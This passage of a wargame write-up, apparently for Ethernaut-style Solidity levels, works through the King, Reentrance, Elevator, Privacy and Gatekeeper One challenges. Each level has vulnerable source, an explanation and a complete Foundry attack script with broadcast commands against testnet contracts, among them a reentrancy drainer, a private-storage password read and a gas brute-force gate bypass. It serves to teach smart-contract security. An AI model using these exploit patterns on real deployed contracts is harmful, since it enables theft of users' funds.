</span><span>    King public king </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>King</span><span>(</span><span style=color:#795da3;font-weight:700>payable</span><span>(</span><span style=color:#0086b3>0xCF1EE241C905C39Add26C82d4a2CCcBC6D070fC2</span><span>));
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>exploit</span><span>() </span><span style=color:#795da3;font-weight:700>public payable</span><span>{
</span><span>        </span><span style=color:#795da3;font-weight:700>address</span><span>(king).call{value : msg.value}(</span><span style=color:#183691>""</span><span>);
</span><span>    }
</span><span>
</span><span>}
</span></code></pre><p>To run script :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ source .env
</span><span>$ forge script script/KingSolve.s.sol:KingSolve --rpc-url $RPC_URL --broadcast
</span></code></pre><h1 id=10-reentrancy>10 Reentrancy</h1><p><code>Reentrancy.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.6</span><span>.</span><span style=color:#0086b3>12</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>'openzeppelin-contracts-06/math/SafeMath.sol'</span><span>;
</span><span>
</span><span>contract Reentrance {
</span><span>  
</span><span>  using SafeMath for uint256;
</span><span>  </span><span style=color:#795da3;font-weight:700>mapping</span><span>(address </span><span style=color:#a71d5d;font-weight:700>=> </span><span>uint) public balances;
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>donate</span><span>(address _to) </span><span style=color:#795da3;font-weight:700>public payable </span><span>{
</span><span>    balances[_to] </span><span style=color:#a71d5d;font-weight:700>= </span><span>balances[_to].</span><span style=color:#62a35c>add</span><span>(msg.value);
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(address _who) </span><span style=color:#795da3;font-weight:700>public view returns </span><span>(uint balance) {
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return </span><span>balances[_who];
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>withdraw</span><span>(uint _amount) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if</span><span>(balances[msg.sender] </span><span style=color:#a71d5d;font-weight:700>>= </span><span>_amount) {
</span><span>      (bool result,) </span><span style=color:#a71d5d;font-weight:700>= </span><span>msg.sender.call{value:_amount}(</span><span style=color:#183691>""</span><span>);
</span><span>      </span><span style=color:#a71d5d;font-weight:700>if</span><span>(result) {
</span><span>        _amount;
</span><span>      }
</span><span>      balances[msg.sender] </span><span style=color:#a71d5d;font-weight:700>-= </span><span>_amount;
</span><span>    }
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#795da3;font-weight:700>receive</span><span>() external payable {}
</span><span>}
</span></code></pre><ul><li>Goal</ul><ol><li>Drain all the ether of the Reentrance contract</ol><ul><li>Solution</ul><ol><li>The <code>withdraw()</code> function is vulnerable to <code>Reentrancy</code>, as it is updating the user balance after the external call.<li>One could deposit some ether to pass the require check in withdraw and and call the withdraw from a contract in which a fallback function is implemented in such a way that it is re entered into withdraw again.<li>So, we will donate some ether to the contract and then call withdraw from a contract.<li>The withdraw call send our ether back and invokes the fallback or receive function of our contract.<li>We can call the <code>withdraw()</code> function again from the fallback function to reenter again into <code>Reentrance</code> contract.<li>Still we can manage to pass require check as our balance wasn't updated yet.<li>We need to check the balance of the <code>Reentrance</code> contract before reentering because when we call the withdraw again after the balance of <code>Reentrance</code> becomes zero will revert the entire transaction.</ol><p><code>ReentrancySolve.s.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.6</span><span>.</span><span style=color:#0086b3>12</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{Reentrance} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"../src/Reentrancy.sol"</span><span>;
</span><span>
</span><span>contract ReentrancySolve is Script{
</span><span>    Reentrance public reentrance </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Reentrance</span><span>(</span><span style=color:#0086b3>0xD063dA7e4876694Cf31a23c7bb61e38184FD5B02</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#795da3;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>startBroadcast</span><span>(vm.</span><span style=color:#795da3;font-weight:700>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Initial Balance : "</span><span>, </span><span style=color:#795da3;font-weight:700>address</span><span>(reentrance).balance);
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>new </span><span>Attack().exploit{value: </span><span style=color:#0086b3>0.001 </span><span>ether}();
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Final Balance : "</span><span>, </span><span style=color:#795da3;font-weight:700>address</span><span>(reentrance).balance);
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Attack{
</span><span>    Reentrance public reentrance </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Reentrance</span><span>(</span><span style=color:#0086b3>0xD063dA7e4876694Cf31a23c7bb61e38184FD5B02</span><span>);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>exploit</span><span>() </span><span style=color:#795da3;font-weight:700>public payable</span><span>{
</span><span>        reentrance.donate{value: </span><span style=color:#0086b3>0.001 </span><span>ether}(</span><span style=color:#795da3;font-weight:700>address</span><span>(this));
</span><span>        reentrance.</span><span style=color:#795da3;font-weight:700>withdraw</span><span>(</span><span style=color:#0086b3>0.001 </span><span>ether);
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// I need my sepolia back
</span><span>        msg.sender.call{value : </span><span style=color:#795da3;font-weight:700>address</span><span>(this).balance}(</span><span style=color:#183691>""</span><span>);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#795da3;font-weight:700>receive</span><span>() payable external{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(reentrance).balance </span><span style=color:#a71d5d;font-weight:700>>= </span><span style=color:#0086b3>0.001 </span><span>ether){
</span><span>            reentrance.</span><span style=color:#795da3;font-weight:700>withdraw</span><span>(</span><span style=color:#0086b3>0.001 </span><span>ether);
</span><span>        }
</span><span>    }
</span><span>}
</span><span>
</span></code></pre><p>To run script :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ source .env
</span><span>$ forge script script/ReentrancySolve.s.sol:ReentrancySolve --rpc-url $RPC_URL --broadcast
</span></code></pre><h1 id=11-elevator>11 Elevator</h1><p><code>Elevator.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>interface </span><span>Building {
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>isLastFloor</span><span>(uint) </span><span style=color:#795da3;font-weight:700>external returns </span><span>(bool);
</span><span>}
</span><span>
</span><span>
</span><span>contract Elevator {
</span><span>  bool public top;
</span><span>  uint public floor;
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>goTo</span><span>(uint _floor) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>    Building building </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Building</span><span>(msg.sender);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if </span><span>(</span><span style=color:#a71d5d;font-weight:700>! </span><span>building.</span><span style=color:#795da3;font-weight:700>isLastFloor</span><span>(_floor)) {
</span><span>      floor </span><span style=color:#a71d5d;font-weight:700>= </span><span>_floor;
</span><span>      top </span><span style=color:#a71d5d;font-weight:700>= </span><span>building.</span><span style=color:#795da3;font-weight:700>isLastFloor</span><span>(floor);
</span><span>    }
</span><span>  }
</span><span>}
</span></code></pre><ul><li>Goal</ul><ol><li>We need to get to the top floor, i.e make the top boolean to <code>true</code></ol><ul><li>Solution</ul><ol><li>The Elevator calling the <code>isLastFloor()</code> function on <code>msg.sender</code> which is insecure. Dont trust the unknown libraries or contract while making the calls.<li>The <code>top</code> variable is being updated upon the return value of the <code>isLastFloor()</code> function.<li>But, To pass the <code>if</code> condition the <code>isLastFloor()</code> should return the <code>false</code>. But the <code>top</code> will become <code>false</code> only if it results false everytime.<li>We can observe that the <code>isLastFloor()</code> function is being called twice. So, we can write a contract which implements <code>isLastFloor()</code> function is such a way that is returns <code>false</code> on first call and <code>true</code> on second call.<li>So, that the <code>if</code> condition satifsies and <code>top</code> will be updated to true.</ol><p><code>ElevatorSolve.s.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{Elevator} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"../src/Elevator.sol"</span><span>;
</span><span>
</span><span>contract ElevatorSolve is Script{
</span><span>    Elevator public elevator </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Elevator</span><span>(</span><span style=color:#0086b3>0xa32a12f573871eE4C1B6d2E9B8BA424d4cD01718</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#795da3;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>startBroadcast</span><span>(vm.</span><span style=color:#795da3;font-weight:700>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Top : "</span><span>, elevator.</span><span style=color:#795da3;font-weight:700>top</span><span>());
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>new </span><span>Attack().</span><span style=color:#795da3;font-weight:700>exploit</span><span>();
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Top : "</span><span>, elevator.</span><span style=color:#795da3;font-weight:700>top</span><span>());
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Attack{
</span><span>    Elevator public elevator </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Elevator</span><span>(</span><span style=color:#0086b3>0xa32a12f573871eE4C1B6d2E9B8BA424d4cD01718</span><span>);
</span><span>    uint public callCount;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>exploit</span><span>() </span><span style=color:#795da3;font-weight:700>public payable</span><span>{
</span><span>        elevator.</span><span style=color:#795da3;font-weight:700>goTo</span><span>(</span><span style=color:#0086b3>10</span><span>);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>isLastFloor</span><span>(uint) </span><span style=color:#795da3;font-weight:700>external returns </span><span>(bool){
</span><span>        callCount </span><span style=color:#a71d5d;font-weight:700>+= </span><span style=color:#0086b3>1</span><span>;
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if</span><span>(callCount </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>1</span><span>){
</span><span>            </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>false</span><span>;
</span><span>        }
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>true</span><span>;
</span><span>    }
</span><span>
</span><span>}
</span></code></pre><p>To run script :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ source .env
</span><span>$ forge script script/ElevatorSolve.s.sol:ElevatorSolve --rpc-url $RPC_URL --broadcast
</span></code></pre><h1 id=12-privacy>12 Privacy</h1><p><code>Privacy.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span>contract Privacy {
</span><span>
</span><span>  bool public locked </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>true</span><span>;
</span><span>  uint256 public </span><span style=color:#0086b3>ID </span><span style=color:#a71d5d;font-weight:700>= </span><span>block.timestamp;
</span><span>  uint8 private flattening </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>10</span><span>;
</span><span>  uint8 private denomination </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>255</span><span>;
</span><span>  uint16 private awkwardness </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>uint16</span><span>(block.timestamp);
</span><span>  bytes32[</span><span style=color:#0086b3>3</span><span>] private data;
</span><span>
</span><span>  </span><span style=color:#795da3;font-weight:700>constructor</span><span>(bytes32[</span><span style=color:#0086b3>3</span><span>] memory _data) {
</span><span>    data </span><span style=color:#a71d5d;font-weight:700>= </span><span>_data;
</span><span>  }
</span><span>  
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>unlock</span><span>(bytes16 _key) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>    </span><span style=color:#62a35c>require</span><span>(_key </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#795da3;font-weight:700>bytes16</span><span>(data[</span><span style=color:#0086b3>2</span><span>]));
</span><span>    locked </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>false</span><span>;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#969896;font-style:italic>/*
</span><span style=color:#969896;font-style:italic>    A bunch of super advanced solidity algorithms...
</span><span style=color:#969896;font-style:italic>
</span><span style=color:#969896;font-style:italic>      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
</span><span style=color:#969896;font-style:italic>      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
</span><span style=color:#969896;font-style:italic>      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
</span><span style=color:#969896;font-style:italic>      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
</span><span style=color:#969896;font-style:italic>      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
</span><span style=color:#969896;font-style:italic>  */
</span><span>}
</span><span>
</span></code></pre><ul><li>Goal</ul><ol><li>We need to unlock the contract, i.e call <code>unlock()</code> function with right password.</ol><ul><li>Solution</ul><ol><li>This challenge is similar to <code>Vault</code>. But we need to understand the storage layout of this contract and query the exact passwor storage slot of the contract.<li>The storage layout of contract as follows :</ol><pre style=color:#323232;background-color:#fff><code><span>bool public locked = true;                      // slot 0
</span><span>uint256 public ID = block.timestamp;             // slot 1
</span><span>uint8 private flattening = 10;                   // slot 2
</span><span>uint8 private denomination = 255;                // slot 2
</span><span>uint16 private awkwardness = uint16(block.timestamp);  // slot 2
</span><span>bytes32[3] private data;    // data[0] => slot 3  // data[1] => slot 4  // data[2] => slot 5
</span></code></pre><ol start=3><li>Password is the lower 16 bytes of the <code>data[2]</code>, i.e <code>require(_key == bytes16(data[2]));</code><li>Since the <code>data[2]</code> stored at slot 5, we can query it with <code>vm.load</code> cheatcode.<li>Calling unlock with this password will solve the challenge.</ol><p><code>PrivacySolve.s.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{Privacy} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"../src/Privacy.sol"</span><span>;
</span><span>
</span><span>contract PrivacySolve is Script{
</span><span>    Privacy public privacy </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Privacy</span><span>(</span><span style=color:#0086b3>0x97Fd86fBE6F968de018C7C15B9D2f2cb2Caa94b2</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#795da3;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>startBroadcast</span><span>(vm.</span><span style=color:#795da3;font-weight:700>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>
</span><span>        bytes32 slot5 </span><span style=color:#a71d5d;font-weight:700>= </span><span>vm.</span><span style=color:#62a35c>load</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(privacy), </span><span style=color:#795da3;font-weight:700>bytes32</span><span>(</span><span style=color:#795da3;font-weight:700>uint256</span><span>(</span><span style=color:#0086b3>5</span><span>)));
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#795da3;font-weight:700>logBytes32</span><span>(slot5);
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Locked : "</span><span>, privacy.</span><span style=color:#795da3;font-weight:700>locked</span><span>());
</span><span>
</span><span>
</span><span>        privacy.</span><span style=color:#795da3;font-weight:700>unlock</span><span>(</span><span style=color:#795da3;font-weight:700>bytes16</span><span>(slot5));
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Locked : "</span><span>, privacy.</span><span style=color:#795da3;font-weight:700>locked</span><span>());
</span><span>
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span></code></pre><p>To run script :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ source .env
</span><span>$ forge script script/PrivacySolve.s.sol:PrivacySolve --rpc-url $RPC_URL --broadcast
</span></code></pre><h1 id=13-gatekeeper-one>13 Gatekeeper One</h1><p><code>GatekeeperOne.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span>contract GatekeeperOne {
</span><span>
</span><span>  address public entrant;
</span><span>
</span><span>  modifier </span><span style=color:#795da3;font-weight:700>gateOne</span><span>() {
</span><span>    </span><span style=color:#62a35c>require</span><span>(msg.sender </span><span style=color:#a71d5d;font-weight:700>!= </span><span>tx.origin);
</span><span>    _;
</span><span>  }
</span><span>
</span><span>  modifier </span><span style=color:#795da3;font-weight:700>gateTwo</span><span>() {
</span><span>    </span><span style=color:#62a35c>require</span><span>(</span><span style=color:#795da3;font-weight:700>gasleft</span><span>() </span><span style=color:#a71d5d;font-weight:700>% </span><span style=color:#0086b3>8191 </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>0</span><span>);
</span><span>    _;
</span><span>  }
</span><span>
</span><span>  modifier </span><span style=color:#795da3;font-weight:700>gateThree</span><span>(bytes8 _gateKey) {
</span><span>      </span><span style=color:#62a35c>require</span><span>(</span><span style=color:#795da3;font-weight:700>uint32</span><span>(</span><span style=color:#795da3;font-weight:700>uint64</span><span>(_gateKey)) </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#795da3;font-weight:700>uint16</span><span>(</span><span style=color:#795da3;font-weight:700>uint64</span><span>(_gateKey)), </span><span style=color:#183691>"GatekeeperOne: invalid gateThree part one"</span><span>);
</span><span>      </span><span style=color:#62a35c>require</span><span>(</span><span style=color:#795da3;font-weight:700>uint32</span><span>(</span><span style=color:#795da3;font-weight:700>uint64</span><span>(_gateKey)) </span><span style=color:#a71d5d;font-weight:700>!= </span><span style=color:#795da3;font-weight:700>uint64</span><span>(_gateKey), </span><span style=color:#183691>"GatekeeperOne: invalid gateThree part two"</span><span>);
</span><span>      </span><span style=color:#62a35c>require</span><span>(</span><span style=color:#795da3;font-weight:700>uint32</span><span>(</span><span style=color:#795da3;font-weight:700>uint64</span><span>(_gateKey)) </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#795da3;font-weight:700>uint16</span><span>(</span><span style=color:#795da3;font-weight:700>uint160</span><span>(tx.origin)), </span><span style=color:#183691>"GatekeeperOne: invalid gateThree part three"</span><span>);
</span><span>    _;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>enter</span><span>(bytes8 _gateKey) </span><span style=color:#795da3;font-weight:700>public gateOne gateTwo gateThree</span><span>(_gateKey) </span><span style=color:#795da3;font-weight:700>returns </span><span>(bool) {
</span><span>    entrant </span><span style=color:#a71d5d;font-weight:700>= </span><span>tx.origin;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>true</span><span>;
</span><span>  }
</span><span>}
</span></code></pre><ul><li>Goal</ul><ol><li>Make it past the gatekeeper and register as an entrant to pass this level.</ol><ul><li>Solution</ul><ol><li>We have to successfully call the <code>enter()</code> function, without being revert by modifier checks.<li>We need to pass three modifier checks. We can simply pass <code>gateOne()</code> by calling it from another contract.<li>To bypass <code>gateTwo()</code> we need to send exact <code>gas</code> that should result the modulo 8191 to zero.<li><code>gasLeft()</code> is a method which calculates the remaining gas after executing instructions before it invoked.<li>We can pass the amount of gas to be transferred to the external call. But we need to send exact amount of gas.<li>One thing that we can do is bruteforce. By randomly bruteforcing with different values of gas, we can pass this modifier check.<li>To pass the <code>gateThree()</code> we need to some calculations. It takes the <code>_gateKey</code> a bytes8 value as argument.<li>Lets calculate from last check.</ol><pre style=color:#323232;background-color:#fff><code><span>uint16 third = uint16(uint160(tx.origin));
</span><span>uint32 two = uint32(third);
</span><span>bytes8 one = bytes8(abi.encodePacked(uint32(0xdeadbeef),two));
</span></code></pre><ol start=9><li>The modifiers checks the lower 32 bits of the gatekey after converting to uint64.<li>So, we can calculate the lower 16 bits of the <code>tx.orgin</code> and pad it with zeros to pass the gatThree and gateOne.<li>Two pass the gateTwo we can add random bits to the MSB position.</ol><p><code>GatekeeperSolve.s.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{GatekeeperOne} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"../src/GatekeeperOne.sol"</span><span>;
</span><span>
</span><span>contract GatekeeperOneSolve is Script{
</span><span>    GatekeeperOne public gateOne </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>GatekeeperOne</span><span>(</span><span style=color:#0086b3>0x4742252E47788a20b2C78a1343DEE68EC8De3804</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#795da3;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>startBroadcast</span><span>(vm.</span><span style=color:#795da3;font-weight:700>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Entrant : "</span><span>, </span><span style=color:#795da3;font-weight:700>address</span><span>(gateOne.</span><span style=color:#795da3;font-weight:700>entrant</span><span>()));
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>new </span><span>Attack().</span><span style=color:#795da3;font-weight:700>exploit</span><span>();
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Entrant : "</span><span>, </span><span style=color:#795da3;font-weight:700>address</span><span>(gateOne.</span><span style=color:#795da3;font-weight:700>entrant</span><span>()));
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Attack{
</span><span>    GatekeeperOne public gateOne </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>GatekeeperOne</span><span>(</span><span style=color:#0086b3>0x4742252E47788a20b2C78a1343DEE68EC8De3804</span><span>);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>exploit</span><span>() </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))
</span><span>        </span><span style=color:#969896;font-style:italic>// uint32(uint64(_gateKey)) != uint64(_gateKey)
</span><span>        </span><span style=color:#969896;font-style:italic>// uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
</span><span>
</span><span>        uint16 third </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>uint16</span><span>(</span><span style=color:#795da3;font-weight:700>uint160</span><span>(tx.origin));
</span><span>        uint32 two </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>uint32</span><span>(third);
</span><span>        bytes8 one </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>bytes8</span><span>(abi.</span><span style=color:#795da3;font-weight:700>encodePacked</span><span>(</span><span style=color:#795da3;font-weight:700>uint32</span><span>(</span><span style=color:#0086b3>0xdeadbeef</span><span>),two));
</span><span>
</span><span>        bytes8 _gateKey </span><span style=color:#a71d5d;font-weight:700>= </span><span>one;
</span><span>        </span><span style=color:#a71d5d;font-weight:700>for </span><span>(uint i </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>0</span><span>; i</span><span style=color:#a71d5d;font-weight:700>&lt;=</span><span style=color:#0086b3>500</span><span>; i</span><span style=color:#a71d5d;font-weight:700>++</span><span>){
</span><span>            (bool success, ) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>address</span><span>(gateOne).call{gas : (</span><span style=color:#0086b3>8191 </span><span style=color:#a71d5d;font-weight:700>* </span><span style=color:#0086b3>4</span><span>)</span><span style=color:#a71d5d;font-weight:700>+</span><span>i}(abi.</span><span style=color:#795da3;font-weight:700>encodeWithSignature</span><span>(</span><span style=color:#183691>"enter(bytes8)"</span><span>, _gateKey));
</span><span>        }
</span><span>    }
</span><span>}
</span></code></pre><p>To run script :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ source .env
